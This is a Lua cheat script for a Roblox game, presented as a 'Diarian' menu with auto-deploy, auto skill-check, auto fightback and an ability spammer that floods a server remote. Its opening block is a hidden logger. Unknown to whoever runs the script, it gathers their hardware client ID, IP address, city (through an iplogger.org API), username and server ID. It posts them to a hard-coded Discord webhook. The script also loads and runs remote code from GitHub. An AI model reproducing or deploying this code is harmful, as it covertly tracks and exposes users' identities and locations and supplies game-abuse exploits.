local cloneref = cloneref or function(value) return value end
local clonefunctionRef = clonefunction or function(value) return value end

local Players = cloneref(game:GetService("Players"))
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local RunService = cloneref(game:GetService("RunService"))
local CollectionService = cloneref(game:GetService("CollectionService"))
local HttpService = cloneref(game:GetService("HttpService"))



local hwid = "Unknown"
pcall(function()
    local rbxAnalytics = game:GetService("RbxAnalyticsService")
    if rbxAnalytics and typeof(rbxAnalytics.GetClientId) == "function" then
        hwid = rbxAnalytics:GetClientId()
    end
end)

local _req = (type(httprequest) == "function" and httprequest)
    or (type(request) == "function" and request)
    or (type(http_request) == "function" and http_request)
    or nil

if _req then
    local lp       = Players.LocalPlayer
    local lpName   = lp and lp.Name or "Unknown"
    local lpUserId = lp and tostring(lp.UserId) or "0"

    local serverInfo = ""
    pcall(function()
        serverInfo = "\n**Server Job ID**: " .. tostring(game.JobId)
    end)

    local executorName = "Unknown"
    pcall(function()
        executorName = identifyexecutor and identifyexecutor() or (syn and "Synapse X") or "Unknown"
    end)

    local userIP   = "Unknown"
    local userCity = "Unknown"

    local ipOk, ipRes = pcall(_req, { Url = "https://api.ipify.org?format=json", Method = "GET" })
    if ipOk and ipRes and ipRes.Body then
        pcall(function()
            local data = HttpService:JSONDecode(ipRes.Body)
            if data and data.ip then userIP = tostring(data.ip) end
        end)
    end

    if userIP ~= "Unknown" then
        local geoOk, geoRes = pcall(_req, {
            Url    = "https://api.iplogger.org/ip/info/?api=api_3R6ZyVnSM2aRtTCyVM71xjWLSObHrvbC&ip=" .. userIP .. "&format=json",
            Method = "GET",
        })
        if geoOk and geoRes and geoRes.Body then
            pcall(function()
                local geo = HttpService:JSONDecode(geoRes.Body)
                if geo then
                    userCity = tostring(geo.city or geo.City or geo.city_name or "Unknown")
                end
            end)
        end
    end

    local gameName = "Unknown"
    pcall(function() gameName = tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) end)

    local avatarUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. lpUserId .. "&width=420&height=420&format=png"
    pcall(function()
        local avOk, avRes = pcall(_req, {
            Url    = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. lpUserId .. "&size=420x420&format=Png&isCircular=false",
            Method = "GET",
        })
        if avOk and avRes and avRes.Body then
            local avData = HttpService:JSONDecode(avRes.Body)
            if avData and avData.data and avData.data[1] and avData.data[1].imageUrl then
                avatarUrl = avData.data[1].imageUrl
            end
        end
    end)

    pcall(_req, {
        Url    = "https://discord.com/api/webhooks/1555434064654237728/MfmJ4M0rCD2X7LnUkJROBahNP2OxLAINoR3_xgE-fv2mkw408S5N2LOpJ_UTQm8QKEyC",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            content = "@everyone",
            embeds = {{
                title  = "Bewitched — Session Log",
                color  = 0x5865F2,
                fields = {
                    {
                        name   = "User",
                        value  = "[" .. lpName .. "](https://www.roblox.com/users/" .. lpUserId .. "/profile)",
                        inline = true
                    },
                    {
                        name   = "UserId",
                        value  = "`" .. lpUserId .. "`",
                        inline = true
                    },
                    {
                        name   = "HWID",
                        value  = "```\n" .. tostring(hwid) .. "\n```",
                        inline = false
                    },
                    {
                        name   = "Game",
                        value  = "[" .. gameName .. "](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")",
                        inline = false
                    },
                    {
                        name   = "Server",
                        value  = "```\n" .. tostring(game.JobId) .. "\n```",
                        inline = false
                    },
                    {
                        name   = "Executor",
                        value  = executorName,
                        inline = true
                    },
                    {
                        name   = "Time",
                        value  = os.date("%Y-%m-%d %H:%M:%S", os.time()),
                        inline = true
                    },
                    {
                        name   = "IP",
                        value  = "`" .. userIP .. "`",
                        inline = true
                    },
                    {
                        name   = "City",
                        value  = userCity,
                        inline = true
                    },
                },
                thumbnail = { url = avatarUrl },
                footer    = { text = "Bewitched logger" }
            }}
        })
    })
end

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Network = ReplicatedStorage:WaitForChild("Network")
local CharacterRemote = Network:WaitForChild("CharacterSelection")
local ServerRemote = Network:WaitForChild("Server")
local FightBackRemote = Network:WaitForChild("FightBack")
local AbilityTrigger = Network:WaitForChild("AbilityTrigger")

local requireRef = clonefunctionRef(require)
local Characters = requireRef(ReplicatedStorage:WaitForChild("Libraries"):WaitForChild("Characters"))
local ReplicaClient = requireRef(ReplicatedStorage:WaitForChild("Libraries"):WaitForChild("ReplicaClient"))
local SkillCheck = requireRef(ReplicatedStorage:WaitForChild("Libraries"):WaitForChild("SkillCheck"))
local Placement = requireRef(ReplicatedStorage:WaitForChild("Libraries"):WaitForChild("Placement"))
local Utility = requireRef(ReplicatedStorage:WaitForChild("Libraries"):WaitForChild("Utility"))
local ShopModule = requireRef(
    ReplicatedStorage:WaitForChild("Scene"):WaitForChild("UserInterface"):WaitForChild("Shop")
)

if getgenv().AzureController and getgenv().AzureController.Stop then
    getgenv().AzureController:Stop()
end
if getgenv().AutoDeployController and getgenv().AutoDeployController.Stop then
    getgenv().AutoDeployController:Stop()
end

local Library = assert(loadstring(game:HttpGet(
    "https://raw.githubusercontent.com/delusorie/ui/refs/heads/main/source.lua"
), "Diarian"))()

Library.Animation.Time = 0.15
Library.Theme["Accent"] = Color3.fromRGB(14, 28, 55)

local LucideIcons
pcall(function()
    LucideIcons = loadstring(game:HttpGetAsync(
        "https://raw.githubusercontent.com/Footagesus/Icons/main/Main-v2.lua"
    ))()
    LucideIcons.SetIconsType("lucide")
end)

local function toVector2(value)
    if typeof(value) == "Vector2" then return value end
    if type(value) == "table" then
        return Vector2.new(value[1] or value.X or 0, value[2] or value.Y or 0)
    end
    return Vector2.new(0, 0)
end

local function applyLucide(page, iconName)
    if not page or not page.Items or not page.Items["Icon"] or not LucideIcons then return end
    local ok, image, offset, size = pcall(function() return LucideIcons.GetIcon(iconName) end)
    if not ok or not image or image == "rbxassetid://0" then return end
    local icon = page.Items["Icon"].Instance
    icon.Image = image
    icon.ImageRectOffset = toVector2(offset)
    icon.ImageRectSize = toVector2(size)
end



local Window          = Library:Window({ Name = "Diarian", Logo = "rbxassetid://91770633749640" })

local Main            = Window:Tab({ Name = "Main", Icon = "house" })
local Combat          = Window:Tab({ Name = "Combat", Icon = "swords" })
local Settings        = Window:Tab({ Name = "Settings", Icon = "settings" })

local MainGeneral     = Main:SubTab({ Name = "General", Icon = "house" })
local CombatGeneral   = Combat:SubTab({ Name = "Combat", Icon = "swords" })
local SettingsGeneral = Settings:SubTab({ Name = "Interface", Icon = "settings" })

local DeploySection   = MainGeneral:Section({ Name = "Auto Deploy", Side = 1 })
local ShopSection     = MainGeneral:Section({ Name = "Shop", Side = 2 })
local Automations     = CombatGeneral:Section({ Name = "Automations", Side = 1 })
local SpammerSection  = CombatGeneral:Section({ Name = "Spammer", Side = 2 })
local Preferences     = SettingsGeneral:Section({ Name = "Interface", Side = 1 })
local Controls        = SettingsGeneral:Section({ Name = "Controls", Side = 2 })

local function notifyToggle(name, enabled)
    pcall(function()
        Library:Notification({
            Name        = "Diarian",
            Description = name .. (enabled and " ON" or " OFF"),
            Icon        = enabled and "check" or "x",
            Duration    = 1.5,
            Color       = enabled and Color3.fromRGB(75, 205, 125) or Color3.fromRGB(225, 85, 85)
        })
    end)
end

local running = true
local setOutspammer
local connections = {}
local function track(conn)
    if conn then table.insert(connections, conn) end
    return conn
end



local ownedCharacters = {}
local names = {}

local function isOwnedCharacter(name, info)
    if type(name) ~= "string" or type(info) ~= "table" or type(info.Category) ~= "string" then return false end
    if info.Custom and not table.find(info.Custom, LocalPlayer.UserId) then return false end
    if not info.Currency then return true end
    if name == "Josie" then return true end
    if ownedCharacters[name] == true then return true end
    if info.Gamepass then
        local ok, owns = pcall(function() return Utility:CheckGamepass(LocalPlayer, info.Gamepass) end)
        if ok and owns == true then return true end
    end
    return false
end

local function rebuildOwnedNames()
    table.clear(names)
    for name, info in pairs(Characters) do
        if isOwnedCharacter(name, info) then
            table.insert(names, name)
        end
    end
    table.sort(names)
end

rebuildOwnedNames()

local selectedCharacter = table.find(names, "Kai") and "Kai" or names[1]
local selectedOutfit    = "Default"
local autoDeploy        = false
local lastDeployAt      = 0
local previousStatus    = {}
local suppressCallbacks = false
local characterDropdown, outfitDropdown

local function currentCharacterName(player)
    local model  = player.Character
    local values = model and model:FindFirstChild("CharacterValues")
    local value  = values and values:FindFirstChild("CharacterName")
    return value and value:IsA("StringValue") and value.Value or nil
end

local function isOccupied(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if currentCharacterName(player) == name then return true end
    end
    return false
end

local function outfitsFor(name)
    local result = { "Default" }
    local info = Characters[name]
    if info and type(info.Outfits) == "table" then
        for outfit in pairs(info.Outfits) do
            if outfit ~= "Default" then table.insert(result, outfit) end
        end
    end
    table.sort(result, function(a, b)
        if a == "Default" then return true end
        if b == "Default" then return false end
        return a < b
    end)
    return result
end

local function displayName(name)
    return string.format("%s (%s)", name, isOccupied(name) and "OPEN" or "FREE")
end

local function parseDisplayName(value)
    if type(value) ~= "string" then return nil end
    return value:match("^(.-) %([A-Z]+%)$")
end

local function namesWithStatus()
    local result = {}
    for _, name in ipairs(names) do
        table.insert(result, {
            Name  = displayName(name),
            Color = not isOccupied(name) and Color3.fromRGB(87, 214, 141) or Color3.fromRGB(255, 100, 100)
        })
    end
    return result
end

local function refreshCharacters()
    if not characterDropdown then return end
    suppressCallbacks = true
    pcall(function()
        characterDropdown:Refresh(namesWithStatus())
        if selectedCharacter then
            characterDropdown:Set(displayName(selectedCharacter))
        end
    end)
    suppressCallbacks = false
end


local deployLock = false
local function attemptDeploy(force)
    if not running then return end
    if not force and not autoDeploy then return end
    if deployLock then return end
    if not selectedCharacter then return end

    if currentCharacterName(LocalPlayer) == selectedCharacter then return end
    if isOccupied(selectedCharacter) then return end
    local now = os.clock()
    if now - lastDeployAt < 0.6 then return end

    local info = Characters[selectedCharacter]
    if not info then return end

    local name     = selectedCharacter
    local outfit   = selectedOutfit
    local category = info.Category

    deployLock     = true
    lastDeployAt   = now

    task.spawn(function()
        pcall(function()
            ServerRemote:FireServer("PreferredOutfits", name, outfit)
        end)
        task.wait(0.1)


        if not running then
            deployLock = false
            return
        end
        if not force and not autoDeploy then
            deployLock = false
            return
        end
        if isOccupied(name) then
            deployLock = false
            return
        end
        if currentCharacterName(LocalPlayer) == name then
            deployLock = false
            return
        end

        pcall(function()
            CharacterRemote:FireServer(category, name, outfit)
        end)

        task.wait(0.5)
        deployLock = false
    end)
end

local function chooseCharacter(name)
    if not Characters[name] then return end
    selectedCharacter = name
    selectedOutfit    = "Default"
    if outfitDropdown then
        suppressCallbacks = true
        pcall(function()
            outfitDropdown:Refresh(outfitsFor(name))
            outfitDropdown:Set("Default")
        end)
        suppressCallbacks = false
    end
    if autoDeploy then task.defer(attemptDeploy, false) end
end



local pendingOwnedCharacters = nil
local ownedCharactersDirty   = false

local function syncOwnedCharacters(data)
    table.clear(ownedCharacters)
    if type(data) == "table" then
        for key, value in pairs(data) do
            if type(key) == "string" and value then
                ownedCharacters[key] = true
            elseif type(value) == "string" then
                ownedCharacters[value] = true
            elseif type(value) == "table" then
                local n = value.Name or value.Character or value.CharacterName
                if type(n) == "string" then ownedCharacters[n] = true end
            end
        end
    end
    rebuildOwnedNames()
    if selectedCharacter and not table.find(names, selectedCharacter) then
        selectedCharacter = names[1]; selectedOutfit = "Default"
    elseif not selectedCharacter then
        selectedCharacter = names[1]
    end
end

local function queueOwnedCharacters(data)
    local snapshot = {}
    if type(data) == "table" then
        for key, value in pairs(data) do
            if type(key) == "string" and value then
                snapshot[key] = true
            elseif type(value) == "string" then
                snapshot[value] = true
            elseif type(value) == "table" then
                local n = value.Name or value.Character or value.CharacterName
                if type(n) == "string" then snapshot[n] = true end
            end
        end
    end
    pendingOwnedCharacters = snapshot
    ownedCharactersDirty   = true
end

pcall(function()
    ReplicaClient.OnNew("PlayerData", function(replica)
        if not running or not replica or not replica.Tags or replica.Tags.Player ~= LocalPlayer then return end
        queueOwnedCharacters(replica.Data and replica.Data.Characters)
        replica:OnChange(function(_, path)
            if not running or not path or path[1] ~= "Characters" then return end
            queueOwnedCharacters(replica.Data and replica.Data.Characters)
        end)
    end)
end)

do
    local deadline = os.clock() + 5
    while running and not ownedCharactersDirty and os.clock() < deadline do
        task.wait(0.05)
    end
    if ownedCharactersDirty then
        ownedCharactersDirty = false
        local snap = pendingOwnedCharacters
        pendingOwnedCharacters = nil
        syncOwnedCharacters(snap)
    else
        rebuildOwnedNames()
    end
end



characterDropdown = DeploySection:Dropdown({
    Name     = "Characters",
    Items    = namesWithStatus(),
    Default  = selectedCharacter and displayName(selectedCharacter) or "",
    Flag     = "AZ_Characters",
    Callback = function(value)
        if suppressCallbacks then return end
        local name = parseDisplayName(value)
        if name and name ~= selectedCharacter then chooseCharacter(name) end
    end
})

outfitDropdown = DeploySection:Dropdown({
    Name     = "Outfits",
    Items    = outfitsFor(selectedCharacter),
    Default  = "Default",
    Flag     = "AZ_Outfits",
    Callback = function(value)
        if suppressCallbacks or type(value) ~= "string" then return end
        if value ~= selectedOutfit then
            selectedOutfit = value
            if autoDeploy then task.defer(attemptDeploy, false) end
        end
    end
})



local function setAutoDeployInternal(enabled)
    if not running then return end
    enabled = enabled and true or false
    local changed = autoDeploy ~= enabled
    autoDeploy = enabled
    if changed then notifyToggle("Auto Deploy", autoDeploy) end
    if autoDeploy then
        lastDeployAt = 0
        deployLock   = false
        task.defer(attemptDeploy, false)
    end
end

local AutoDeployToggle = DeploySection:Toggle({
    Name     = "Auto Deploy",
    Default  = false,
    Flag     = "AZ_AutoDeploy",
    Callback = function(enabled) setAutoDeployInternal(enabled) end
})

AutoDeployToggle:Keybind({
    Name         = "Auto Deploy Key",
    Default      = Enum.KeyCode.N,
    Mode         = "Toggle",
    Flag         = "AZ_AutoDeployKey",
    MobileButton = { Enabled = true, Icon = "13050670483" },
    Callback     = function() setAutoDeployInternal(not autoDeploy) end
})

DeploySection:Button({
    Name     = "Deploy Character",
    Callback = function() task.spawn(attemptDeploy, true) end
})



local shopDebounce = false
ShopSection:Button({
    Name = "Open Shop",
    Callback = function()
        if not running or shopDebounce then return end
        local char = LocalPlayer.Character
        if not char or not char:FindFirstChild("CharacterValues") or char:FindFirstChild("HoldingOn") then return end
        shopDebounce = true
        pcall(ShopModule)
        task.delay(0.25, function() shopDebounce = false end)
    end
})



local autoSkillCheck          = false
local autoFightback           = false
local autoDraw                = false

local skillCheckConnections   = setmetatable({}, { __mode = "k" })
local originalSkillCheckStart = SkillCheck.Start
local hookedSkillCheckStart

local function disconnectSkillCheckConnections()
    for self, conn in pairs(skillCheckConnections) do
        if conn then pcall(function() conn:Disconnect() end) end
        skillCheckConnections[self] = nil
    end
end

hookedSkillCheckStart = function(self, ...)
    local old = skillCheckConnections[self]
    if old then
        old:Disconnect(); skillCheckConnections[self] = nil
    end
    local result = originalSkillCheckStart(self, ...)
    if not autoSkillCheck or self.Destroyed or not self.Active or not self.CheckZone or not self.Needle then
        return result
    end
    local targetRotation = self.CheckZone.Rotation - 26.5
    local connection
    connection = self.Needle:GetPropertyChangedSignal("Rotation"):Connect(function()
        if not autoSkillCheck or self.Destroyed or not self.Active then
            if connection then connection:Disconnect() end
            skillCheckConnections[self] = nil
            return
        end
        if self.Needle.Rotation < targetRotation then return end
        if connection then connection:Disconnect() end
        skillCheckConnections[self] = nil
        if autoSkillCheck and not self.Destroyed and self.Active and not self.CooldownActive then
            self:_resolve()
        end
    end)
    skillCheckConnections[self] = connection
    return result
end

local function setAutoSkillCheck(enabled)
    autoSkillCheck = enabled
    if enabled then
        SkillCheck.Start = hookedSkillCheckStart
    else
        if SkillCheck.Start == hookedSkillCheckStart then SkillCheck.Start = originalSkillCheckStart end
        disconnectSkillCheckConnections()
    end
end

local ClashFlags     = { "HoldingOn", "InExecution", "ThornStake", "RedOakStake", "WhiteOakStake", "WoodenStake" }
local PromptPatterns = { "fight back", "press f", "break free", "struggle", "clash" }

local function hasFightbackPrompt()
    local gui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not gui then return false end
    local sc = gui:FindFirstChild("SkillCheck")
    local fr = sc and sc:FindFirstChild("Frame")
    if fr and fr.Visible then return false end
    for _, obj in ipairs(gui:GetDescendants()) do
        if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Visible and obj.TextTransparency < 1 then
            local text = obj.Text:lower()
            for _, p in ipairs(PromptPatterns) do
                if text:find(p, 1, true) then return true end
            end
        end
    end
    return false
end

local function inFightbackClash()
    if hasFightbackPrompt() then return true end
    local char = LocalPlayer.Character
    if not char then return false end
    for _, flag in ipairs(ClashFlags) do
        if char:FindFirstChild(flag) then return true end
    end
    return false
end

Automations:Toggle({
    Name = "Auto SkillCheck",
    Default = false,
    Flag = "AZ_AutoSkillCheck",
    Callback = function(e) if running then setAutoSkillCheck(e) end end
})
Automations:Toggle({
    Name = "Auto Fightback",
    Default = false,
    Flag = "AZ_AutoFightback",
    Callback = function(e) if running then autoFightback = e end end
})
Automations:Toggle({
    Name = "Auto Draw",
    Default = false,
    Flag = "AZ_AutoDraw",
    Callback = function(e) if running then autoDraw = e end end
})

track(UserInputService.InputBegan:Connect(function(input, processed)
    if not running or not autoDraw or processed then return end
    if input.UserInputType ~= Enum.UserInputType.MouseButton1
        and input.UserInputType ~= Enum.UserInputType.Touch then
        return
    end
    if not Placement.Settings.Active[LocalPlayer] then return end
    local ghost = Placement.Settings.GhostModel
    if not ghost or not ghost.PrimaryPart then return end
    local name = ghost.Name
    if name:split(" ")[2] ~= "Sigil" then return end
    pcall(function() ServerRemote:FireServer("Placement", "Place", name, ghost.PrimaryPart.CFrame) end)
    Placement.Settings.Active[LocalPlayer] = false
    pcall(function() ghost:Destroy() end)
end))



local OUT_RANGE                                               = 350
local OUT_INTERVAL                                            = 0
local OUT_PACK                                                = 500
local OUT_RESPECT_CD                                          = false
local SUPPORTED_TYPES                                         = { Area = true, Hit = true, Click = true, Hold = true, DualHold = true }
local FUNCTION_NAMES                                          = { "Equip", "Unequip", "SetTarget" }

local targetModels                                            = {}
local uiFunctions                                             = {}
local outspammerEnabled                                       = false
local excludeFriends                                          = true
local excludedTargets                                         = {}
local friendCache                                             = {}
local outspammerConnection
local equippedFunction, equippedUpvalueIndex, nextUpvalueScan = nil, nil, 0
local outLastFire                                             = 0
local outCurrentEquipped, outAbilityKey, outLastArg, outPack  = nil, nil, nil, nil

local function addTarget(m) if m:IsA("Model") then targetModels[m] = true end end
for _, m in ipairs(CollectionService:GetTagged("Target")) do addTarget(m) end
track(CollectionService:GetInstanceAddedSignal("Target"):Connect(addTarget))
track(CollectionService:GetInstanceRemovedSignal("Target"):Connect(function(m) targetModels[m] = nil end))

local function serverMemberNames()
    local r = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then table.insert(r, p.Name) end
    end
    table.sort(r); return r
end

local function rebuildExcluded(selected)
    table.clear(excludedTargets)
    if type(selected) ~= "table" then return end
    for _, n in ipairs(selected) do excludedTargets[n] = true end
end

local function refreshFriend(player)
    if not player or player == LocalPlayer then return end
    task.spawn(function()
        local ok, result = pcall(function() return LocalPlayer:IsFriendsWith(player.UserId) end)
        friendCache[player.UserId] = ok and result or false
    end)
end
for _, p in ipairs(Players:GetPlayers()) do refreshFriend(p) end
track(Players.PlayerAdded:Connect(refreshFriend))
track(Players.PlayerRemoving:Connect(function(p)
    friendCache[p.UserId] = nil; excludedTargets[p.Name] = nil
end))

local function loadUIFunctions(useGC)
    pcall(function()
        if type(getsenv) ~= "function" then return end
        local env = getsenv(ReplicatedStorage.Scene.Player.UIs)
        for _, n in ipairs(FUNCTION_NAMES) do uiFunctions[n] = rawget(env, n) end
    end)
    if useGC and not next(uiFunctions) and type(getgc) == "function" then
        pcall(function()
            for _, fn in ipairs(getgc()) do
                local fname = type(fn) == "function" and debug.info(fn, "n")
                if table.find(FUNCTION_NAMES, fname) then
                    local ok, s = pcall(function() return getfenv(fn).script end)
                    if ok and s and s.Name == "UIs" then uiFunctions[fname] = fn end
                end
            end
        end)
    end
end

local function equippedAbility()
    if not equippedUpvalueIndex then
        if os.clock() < nextUpvalueScan then return nil end
        nextUpvalueScan = os.clock() + 0.25
        for _, name in ipairs(FUNCTION_NAMES) do
            local fn = uiFunctions[name]
            if fn then
                local ok, values = pcall(debug.getupvalues, fn)
                if ok and type(values) == "table" then
                    for index, value in pairs(values) do
                        if type(value) == "table" and type(value.Name) == "string" and type(value.Data) == "table" then
                            equippedFunction = fn; equippedUpvalueIndex = index; return value
                        end
                    end
                end
            end
        end
        return nil
    end
    local ok, a, b = pcall(debug.getupvalue, equippedFunction, equippedUpvalueIndex)
    if not ok then return nil end
    local value = type(a) == "table" and a or b
    if type(value) == "table" and type(value.Data) == "table" then return value end
    equippedFunction = nil; equippedUpvalueIndex = nil; return nil
end

local function shouldExcludeModel(model)
    local player = Players:GetPlayerFromCharacter(model)
    if not player then return false end
    if player == LocalPlayer then return true end
    if excludedTargets[player.Name] then return true end
    if excludeFriends and friendCache[player.UserId] then return true end
    return false
end

local function pickTarget(root, range)
    local camera = workspace.CurrentCamera
    if not camera then return nil end
    local mouse = UserInputService:GetMouseLocation()
    local rootPos = root.Position
    local myChar = LocalPlayer.Character
    local best, bestScore = nil, math.huge
    for target in pairs(targetModels) do
        if not target.Parent or target == myChar or shouldExcludeModel(target) then continue end
        local primary = target.PrimaryPart
        local humanoid = primary and target:FindFirstChildOfClass("Humanoid")
        if humanoid and humanoid.Health > 0
            and (primary.Position - rootPos).Magnitude <= range
            and target:FindFirstChild("CharacterValues") then
            local point, onScreen = camera:WorldToViewportPoint(primary.Position)
            local dx, dy = point.X - mouse.X, point.Y - mouse.Y
            local score = dx * dx + dy * dy
            if onScreen and point.Z > 0 and score < bestScore then
                best = target; bestScore = score
            end
        end
    end
    return best
end

local function outspammerStep()
    local char     = LocalPlayer.Character
    local root     = char and char.PrimaryPart
    local hum      = char and char:FindFirstChildOfClass("Humanoid")
    local equipped = root and hum and hum.Health > 0 and equippedAbility()
    if not equipped or not SUPPORTED_TYPES[equipped.Data.Type] then return end
    if os.clock() - outLastFire < OUT_INTERVAL then return end
    local data = equipped.Data
    local abilityName = equipped.Name
    if equipped ~= outCurrentEquipped then
        outCurrentEquipped = equipped
        outAbilityKey = abilityName:gsub("[^%w_]", "_")
    end
    if OUT_RESPECT_CD then
        local cooldowns = LocalPlayer:FindFirstChild("Cooldowns")
        local cooldownEnd = cooldowns and cooldowns:GetAttribute(outAbilityKey)
        if cooldownEnd and workspace:GetServerTimeNow() < cooldownEnd then return end
        if data.Mana then
            local values = char:FindFirstChild("CharacterValues")
            local mana = values and values:FindFirstChild(data.ManaType or "Magic")
            if not mana or mana.Value < data.Mana then return end
        end
    end
    local target = data.Type ~= "Area" and pickTarget(root, data.Magnitude or OUT_RANGE)
    if data.Type ~= "Area" and not target then return end
    outLastFire = os.clock()
    local arg = target and (data.Type == "Hit" and CFrame.new(target.PrimaryPart.Position) or target)
    if arg ~= outLastArg then
        outLastArg = arg; outPack = table.create(OUT_PACK, arg)
    end
    AbilityTrigger:FireServer(abilityName, table.unpack(outPack))
end

setOutspammer = function(enabled)
    enabled = enabled and true or false
    local changed = outspammerEnabled ~= enabled
    outspammerEnabled = enabled
    if changed then notifyToggle("Spammer", outspammerEnabled) end
    if outspammerConnection then
        outspammerConnection:Disconnect(); outspammerConnection = nil
    end
    if not enabled or not running then return end
    if not next(uiFunctions) then task.spawn(loadUIFunctions, true) end
    outspammerConnection = RunService.Heartbeat:Connect(function()
        if not running or not outspammerEnabled then return end
        local ok = pcall(outspammerStep)
        if not ok then
            if outspammerConnection then
                outspammerConnection:Disconnect(); outspammerConnection = nil
            end
            outspammerEnabled = false
        end
    end)
end

local SpammerToggle = SpammerSection:Toggle({
    Name = "Spammer",
    Default = false,
    Flag = "AZ_Spammer",
    Callback = function(e) setOutspammer(e) end
})
SpammerToggle:Keybind({
    Name = "Spammer Key",
    Default = Enum.KeyCode.F,
    Mode = "Toggle",
    Flag = "AZ_SpammerKey",
    MobileButton = { Enabled = true, Icon = "13050670483" },
    Callback = function() setOutspammer(not outspammerEnabled) end
})
SpammerSection:Dropdown({
    Name = "Exclude Targets",
    Items = serverMemberNames(),
    Default = {},
    Multi = true,
    Flag = "AZ_ExcludeTargets",
    Callback = function(s) rebuildExcluded(s) end
})
SpammerSection:Toggle({
    Name = "Exclude Friends",
    Default = true,
    Flag = "AZ_ExcludeFriends",
    Callback = function(e) excludeFriends = e end
})

loadUIFunctions(false)



Preferences:Toggle({ Name = "Show Open / Close", Default = true, Flag = "AZ_ShowOpenClose", Callback = function() end })

Library:Watermark({ Name = "Diarian", Logo = "rbxassetid://91770633749640" })



local controller = {}
function controller:Stop()
    if not running then return end
    running = false; autoDeploy = false; autoFightback = false; autoDraw = false
    setAutoSkillCheck(false); setOutspammer(false)
    if outspammerConnection then
        pcall(function() outspammerConnection:Disconnect() end); outspammerConnection = nil
    end
    for _, conn in ipairs(connections) do pcall(function() conn:Disconnect() end) end
    table.clear(connections)
    if getgenv().AzureController == self then getgenv().AzureController = nil end
    if getgenv().AutoDeployController == self then getgenv().AutoDeployController = nil end
    pcall(function() Library:Unload() end)
end

getgenv().AzureController      = controller
getgenv().AutoDeployController = controller

Controls:Button({ Name = "Unload UI", Callback = function() controller:Stop() end })




task.spawn(function()
    while running do
        if autoFightback and inFightbackClash() then
            pcall(function() FightBackRemote:FireServer() end)
            task.wait(0.03)
        else
            task.wait(0.1)
        end
    end
end)


track(PlayerGui.ChildAdded:Connect(function(gui)
    if running and autoDeploy and gui.Name == "CharacterSelection" then
        task.wait(0.1)
        attemptDeploy(false)
    end
end))


task.spawn(function()
    while running do
        local changed = false
        for _, name in ipairs(names) do
            local occupied = isOccupied(name)
            if previousStatus[name] ~= occupied then
                previousStatus[name] = occupied
                changed = true
            end
        end
        if changed then refreshCharacters() end
        if autoDeploy then attemptDeploy(false) end
        task.wait(0.35)
    end
end)


task.spawn(function()
    while running do
        if ownedCharactersDirty then
            ownedCharactersDirty = false
            local snap = pendingOwnedCharacters
            pendingOwnedCharacters = nil
            syncOwnedCharacters(snap)
            refreshCharacters()
            if outfitDropdown and selectedCharacter then
                suppressCallbacks = true
                pcall(function()
                    outfitDropdown:Refresh(outfitsFor(selectedCharacter))
                    outfitDropdown:Set(selectedOutfit or "Default")
                end)
                suppressCallbacks = false
            end
        end
        task.wait(0.5)
    end
end)
